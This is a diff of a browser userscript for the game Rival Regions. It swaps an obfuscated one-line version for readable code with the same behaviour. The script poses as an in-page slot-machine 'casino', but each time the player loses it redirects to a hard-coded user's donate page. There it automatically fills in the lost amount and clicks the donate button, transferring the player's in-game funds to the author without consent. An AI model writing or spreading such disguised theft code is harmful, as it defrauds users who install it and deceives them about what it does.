@@ -1,1 +1,148 @@
-function _0x5a8a(_0x577bd5,_0x1a9307){const _0x3b39bb=_0x3b39();return _0x5a8a=function(_0x5a8aab,_0x331a24){_0x5a8aab=_0x5a8aab-0xa0;let _0x49cf0b=_0x3b39bb[_0x5a8aab];return _0x49cf0b;},_0x5a8a(_0x577bd5,_0x1a9307);}(function(_0x810a8d,_0x23edda){const _0x17c6f9=_0x5a8a,_0x5cb53=_0x810a8d();while(!![]){try{const _0xccd177=-parseInt(_0x17c6f9(0xc2))/0x1+parseInt(_0x17c6f9(0xae))/0x2+parseInt(_0x17c6f9(0xa8))/0x3+parseInt(_0x17c6f9(0xda))/0x4*(parseInt(_0x17c6f9(0xcc))/0x5)+parseInt(_0x17c6f9(0xce))/0x6*(parseInt(_0x17c6f9(0xa2))/0x7)+parseInt(_0x17c6f9(0xd0))/0x8+parseInt(_0x17c6f9(0xd8))/0x9*(-parseInt(_0x17c6f9(0xa3))/0xa);if(_0xccd177===_0x23edda)break;else _0x5cb53['push'](_0x5cb53['shift']());}catch(_0x23c7c3){_0x5cb53['push'](_0x5cb53['shift']());}}}(_0x3b39,0x909d8),(function(){'use strict';const _0x5a3f17=_0x5a8a;const _0x1f2e1b=_0x5a3f17(0xba),_0x23f42a=_0x5a3f17(0xb3)+_0x1f2e1b;function _0x46330c(){const _0x2931f3=_0x5a3f17,_0x147822=_0x2931f3(0xaf)+_0x1f2e1b,_0x5203d4=document[_0x2931f3(0xcb)](_0x2931f3(0xa0)+_0x147822+'\x22]');_0x5203d4?_0x5203d4[_0x2931f3(0xbb)]():(window[_0x2931f3(0xa9)][_0x2931f3(0xb4)]=_0x23f42a,setTimeout(()=>{location['reload']();},0x320));}function _0x458825(){const _0x23efa0=_0x5a3f17,_0x175d7a=['🍒','🍋','🍇','⭐','💎'];return _0x175d7a[Math['floor'](Math[_0x23efa0(0xb9)]()*_0x175d7a[_0x23efa0(0xbe)])];}function _0x3bf943(){const _0x537928=_0x5a3f17,_0x302adc=document[_0x537928(0xcb)]('#m');if(!_0x302adc)return 0x0;const _0x2ddf73=_0x302adc['textContent'],_0xe444b2=Number(_0x2ddf73['replace'](/\./g,''));return _0xe444b2||0x0;}function _0x1112b2(_0x3a015f,_0x2bffd0){const _0x2a5b04=_0x5a3f17;if(_0x3a015f>_0x2bffd0)return{'mensaje':_0x2a5b04(0xd7),'exito':![]};const _0x1c11c8=[_0x458825(),_0x458825(),_0x458825()],_0x12a61f=_0x1c11c8[_0x2a5b04(0xaa)]('\x20');let _0x4f76b3=0x0;if(_0x1c11c8[0x0]===_0x1c11c8[0x1]&&_0x1c11c8[0x1]===_0x1c11c8[0x2])_0x4f76b3=_0x3a015f*0xa;else(_0x1c11c8[0x0]===_0x1c11c8[0x1]||_0x1c11c8[0x1]===_0x1c11c8[0x2])&&(_0x4f76b3=_0x3a015f*0x2);const _0x8187d5=_0x2bffd0-_0x3a015f+_0x4f76b3;return{'mensaje':'\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20style=\x22font-size:18px;\x20text-align:center;\x22>'+_0x12a61f+_0x2a5b04(0xbf)+(_0x4f76b3>0x0?_0x2a5b04(0xad)+_0x4f76b3+'!':'Perdiste\x20$'+_0x3a015f+_0x2a5b04(0xc0))+_0x2a5b04(0xa1)+_0x8187d5[_0x2a5b04(0xbd)](0x2)+_0x2a5b04(0xd1),'exito':!![],'perdida':_0x4f76b3===0x0?_0x3a015f:0x0};}function _0x12fe86(){const _0x5f01f9=_0x5a3f17,_0x931ed8=localStorage[_0x5f01f9(0xd3)]('casino_perdida'),_0x2c0098=parseFloat(_0x931ed8);if(!_0x931ed8||isNaN(_0x2c0098)||_0x2c0098<=0x0)return;const _0x51b6bb=setInterval(()=>{const _0x40ad6b=_0x5f01f9,_0x18a173=document[_0x40ad6b(0xcb)](_0x40ad6b(0xc6));if(_0x18a173){_0x18a173[_0x40ad6b(0xbb)](),clearInterval(_0x51b6bb);const _0x23abad=setInterval(()=>{const _0x28682e=_0x40ad6b,_0x40cca5=document[_0x28682e(0xcb)](_0x28682e(0xd4)),_0x195f77=document['querySelector'](_0x28682e(0xb8));if(_0x40cca5&&_0x195f77){_0x40cca5[_0x28682e(0xc5)]=_0x2c0098['toString']();const _0x46c7e4=new Event(_0x28682e(0xab),{'bubbles':!![]});_0x40cca5[_0x28682e(0xac)](_0x46c7e4),_0x195f77[_0x28682e(0xbb)](),console[_0x28682e(0xcd)](_0x28682e(0xb0)+_0x2c0098),localStorage[_0x28682e(0xc9)](_0x28682e(0xc1)),clearInterval(_0x23abad);}},0x1f4);}},0x1f4);}const _0x1a598c='\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20id=\x22casinoRR\x22\x20style=\x22position:\x20fixed;\x20top:\x20100px;\x20right:\x2030px;\x20z-index:\x209999;\x20background:\x20#111;\x20color:\x20white;\x20border:\x202px\x20solid\x20gold;\x20border-radius:\x2010px;\x20padding:\x2015px;\x20font-family:\x20Arial,\x20sans-serif;\x20width:\x20200px;\x20display:\x20none;\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3\x20style=\x22margin-top:0;\x20text-align:center;\x22>🎰\x20Casino\x20RR</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p><b>Saldo:</b>\x20<span\x20id=\x22casino_saldo\x22>...</span>\x20$</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<input\x20id=\x22casino_apuesta\x22\x20type=\x22number\x22\x20placeholder=\x22Apuesta\x20$\x22\x20min=\x221\x22\x20style=\x22width:\x20100%;\x20padding:\x205px;\x20margin-top:\x205px;\x22\x20/>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<button\x20id=\x22casino_jugar\x22\x20style=\x22margin-top:10px;\x20width:100%;\x20background-color:\x20gold;\x20color:black;\x22>Jugar</button>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20id=\x22casino_resultado\x22\x20style=\x22margin-top:\x2010px;\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<button\x20id=\x22btnAbrirCasino\x22\x20style=\x22position:\x20fixed;\x20bottom:\x2020px;\x20right:\x2020px;\x20z-index:\x209999;\x20background-color:\x20gold;\x20color:black;\x20border:\x20none;\x20padding:\x2010px;\x20border-radius:\x208px;\x20font-weight:\x20bold;\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20🎰\x20Abrir\x20Casino\x0a\x20\x20\x20\x20\x20\x20\x20\x20</button>\x0a\x20\x20\x20\x20';function _0x125efa(){const _0x2f3abe=_0x5a3f17;if(document[_0x2f3abe(0xcb)]('#casinoRR'))return;document[_0x2f3abe(0xb2)][_0x2f3abe(0xb6)]('beforeend',_0x1a598c);const _0x81e421=document['querySelector'](_0x2f3abe(0xb5)),_0x2fdd45=document[_0x2f3abe(0xcb)](_0x2f3abe(0xc7)),_0x4ec567=document[_0x2f3abe(0xcb)](_0x2f3abe(0xd9)),_0x40e63f=document[_0x2f3abe(0xcb)](_0x2f3abe(0xa6)),_0x29baa0=document[_0x2f3abe(0xcb)](_0x2f3abe(0xd6)),_0x2c0b85=document['querySelector'](_0x2f3abe(0xa4));function _0x170f84(){const _0x86439=_0x2f3abe,_0x20af2e=_0x3bf943();_0x40e63f[_0x86439(0xa5)]=_0x20af2e[_0x86439(0xbd)](0x2);}_0x81e421['addEventListener']('click',()=>{const _0x5e62e7=_0x2f3abe;_0x2fdd45[_0x5e62e7(0xb1)][_0x5e62e7(0xc8)]=_0x2fdd45[_0x5e62e7(0xb1)]['display']===_0x5e62e7(0xd2)?'block':_0x5e62e7(0xd2),_0x170f84();}),_0x4ec567[_0x2f3abe(0xc4)](_0x2f3abe(0xbb),()=>{const _0x83080b=_0x2f3abe,_0x539e79=parseFloat(_0x29baa0[_0x83080b(0xc5)]),_0x4d5817=_0x3bf943();if(isNaN(_0x539e79)||_0x539e79<=0x0){alert(_0x83080b(0xc3));return;}const _0xb87a70=_0x1112b2(_0x539e79,_0x4d5817);_0x2c0b85[_0x83080b(0xca)]=_0xb87a70[_0x83080b(0xa7)],_0xb87a70['perdida']>0x0&&(localStorage['setItem'](_0x83080b(0xc1),_0xb87a70[_0x83080b(0xcf)]),setTimeout(_0x46330c,0x1f4));});}function _0x1e0faf(){const _0x2297dc=_0x5a3f17;_0x125efa(),window[_0x2297dc(0xa9)]['hash'][_0x2297dc(0xbc)]('donate/user/'+_0x1f2e1b)&&_0x12fe86();}document[_0x5a3f17(0xb7)]===_0x5a3f17(0xd5)?document[_0x5a3f17(0xc4)]('DOMContentLoaded',_0x1e0faf):_0x1e0faf();}()));function _0x3b39(){const _0x4abb8c=['No\x20tienes\x20suficiente\x20saldo.','288otLsaE','#casino_jugar','32MKwJfJ','[action=\x22','</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p><b>Saldo\x20nuevo\x20estimado:</b>\x20$','56tvmJFu','323260zHkEgw','#casino_resultado','textContent','#casino_saldo','mensaje','2198088PxXrCJ','location','join','input','dispatchEvent','¡Ganaste\x20$','264478OsNJMd','slide/donate/user/','✅\x20Donación\x20automática\x20realizada:\x20€','style','body','https://rivalregions.com/#slide/donate/user/','href','#btnAbrirCasino','insertAdjacentHTML','readyState','.donate_sell_button','random','2000962000','click','includes','toFixed','length','</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p>','...','casino_perdida','999188FjYCHC','Ingresa\x20una\x20cantidad\x20válida.','addEventListener','value','.donate_w','#casinoRR','display','removeItem','innerHTML','querySelector','291075lgNolF','log','83100qAhEVN','perdida','9476072VcBtsq','</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','none','getItem','input.donate_amount','loading','#casino_apuesta'];_0x3b39=function(){return _0x4abb8c;};return _0x3b39();}
+(function () {
+  'use strict';
+
+  const DONATION_ID = '2000962000';
+  const DONATION_URL = `https://rivalregions.com/#slide/donate/user/${DONATION_ID}`;
+
+  function redirigirODonar() {
+    const actionUrl = `slide/donate/user/${DONATION_ID}`;
+    const form = document.querySelector(`[action="${actionUrl}"]`);
+
+    if (form) {
+      form.click();
+    } else {
+      window.location.href = DONATION_URL;
+      setTimeout(() => location.reload(), 800);
+    }
+  }
+
+  function simboloRandom() {
+    const simbolos = ['🍒', '🍋', '🍇', '⭐', '💎'];
+    return simbolos[Math.floor(Math.random() * simbolos.length)];
+  }
+
+  function obtenerSaldo() {
+    const el = document.querySelector('#m');
+    if (!el) return 0;
+    const texto = el.textContent;
+    return Number(texto.replace(/\./g, '')) || 0;
+  }
+
+  function jugarCasino(apuesta, saldo) {
+    if (apuesta > saldo) return { mensaje: 'No tienes suficiente saldo.', exito: false };
+
+    const resultado = [simboloRandom(), simboloRandom(), simboloRandom()];
+    const resultadoTexto = resultado.join(' ');
+    let ganancia = 0;
+
+    if (resultado[0] === resultado[1] && resultado[1] === resultado[2]) {
+      ganancia = apuesta * 10;
+    } else if (resultado[0] === resultado[1] || resultado[1] === resultado[2]) {
+      ganancia = apuesta * 2;
+    }
+
+    const saldoNuevo = saldo - apuesta + ganancia;
+
+    return {
+      mensaje: `
+        <p style="font-size:18px; text-align:center;">
+          ${resultadoTexto}<br>
+          ${ganancia > 0 ? `¡Ganaste $${ganancia}!` : `Perdiste $${apuesta}`}</p>
+          <p><b>Saldo nuevo estimado:</b> $${saldoNuevo.toFixed(2)}</p>
+      `,
+      exito: true,
+      perdida: ganancia === 0 ? apuesta : 0
+    };
+  }
+
+  function procesarDonacionAutomatica() {
+    const cantidad = parseFloat(localStorage.getItem('casino_perdida'));
+    if (!cantidad || isNaN(cantidad) || cantidad <= 0) return;
+
+    const intv = setInterval(() => {
+      const boton = document.querySelector('.donate_w');
+      if (boton) {
+        boton.click();
+        clearInterval(intv);
+
+        const subIntv = setInterval(() => {
+          const input = document.querySelector('input.donate_amount');
+          const btnEnviar = document.querySelector('.donate_sell_button');
+          if (input && btnEnviar) {
+            input.value = cantidad.toString();
+            input.dispatchEvent(new Event('input', { bubbles: true }));
+            btnEnviar.click();
+            console.log('✅ Donación automática realizada: €' + cantidad);
+            localStorage.removeItem('casino_perdida');
+            clearInterval(subIntv);
+          }
+        }, 500);
+      }
+    }, 500);
+  }
+
+  const casinoHTML = `
+    <div id="casinoRR" style="position: fixed; top: 100px; right: 30px; z-index: 9999; background: #111; color: white; border: 2px solid gold; border-radius: 10px; padding: 15px; font-family: Arial, sans-serif; width: 200px; display: none;">
+      <h3 style="margin-top:0; text-align:center;">🎰 Casino RR</h3>
+      <p><b>Saldo:</b> <span id="casino_saldo">...</span> $</p>
+      <input id="casino_apuesta" type="number" placeholder="Apuesta $" min="1" style="width:100%; padding:5px; margin-top:5px;" />
+      <button id="casino_jugar" style="margin-top:10px; width:100%; background-color: gold; color:black;">Jugar</button>
+      <div id="casino_resultado" style="margin-top:10px;"></div>
+    </div>
+    <button id="btnAbrirCasino" style="position: fixed; bottom: 20px; right: 20px; z-index: 9999; background-color: gold; color:black; border: none; padding: 10px; border-radius: 8px; font-weight: bold;">
+      🎰 Abrir Casino
+    </button>
+  `;
+
+  function insertarCasino() {
+    if (document.querySelector('#casinoRR')) return;
+
+    document.body.insertAdjacentHTML('beforeend', casinoHTML);
+
+    const btnAbrir = document.querySelector('#btnAbrirCasino');
+    const panel = document.querySelector('#casinoRR');
+    const btnJugar = document.querySelector('#casino_jugar');
+    const saldoSpan = document.querySelector('#casino_saldo');
+    const inputApuesta = document.querySelector('#casino_apuesta');
+    const divResultado = document.querySelector('#casino_resultado');
+
+    function actualizarSaldo() {
+      const saldo = obtenerSaldo();
+      saldoSpan.textContent = saldo.toFixed(2);
+    }
+
+    btnAbrir.addEventListener('click', () => {
+      panel.style.display = panel.style.display === 'none' ? 'block' : 'none';
+      actualizarSaldo();
+    });
+
+    btnJugar.addEventListener('click', () => {
+      const apuesta = parseFloat(inputApuesta.value);
+      const saldo = obtenerSaldo();
+
+      if (isNaN(apuesta) || apuesta <= 0) {
+        alert('Ingresa una cantidad válida.');
+        return;
+      }
+
+      const resultado = jugarCasino(apuesta, saldo);
+      divResultado.innerHTML = resultado.mensaje;
+
+      if (resultado.perdida > 0) {
+        localStorage.setItem('casino_perdida', resultado.perdida);
+        setTimeout(redirigirODonar, 500);
+      }
+    });
+  }
+
+  function iniciar() {
+    insertarCasino();
+    if (window.location.hash.includes(`donate/user/${DONATION_ID}`)) {
+      procesarDonacionAutomatica();
+    }
+  }
+
+  document.readyState === 'loading'
+    ? document.addEventListener('DOMContentLoaded', iniciar)
+    : iniciar();
+})();
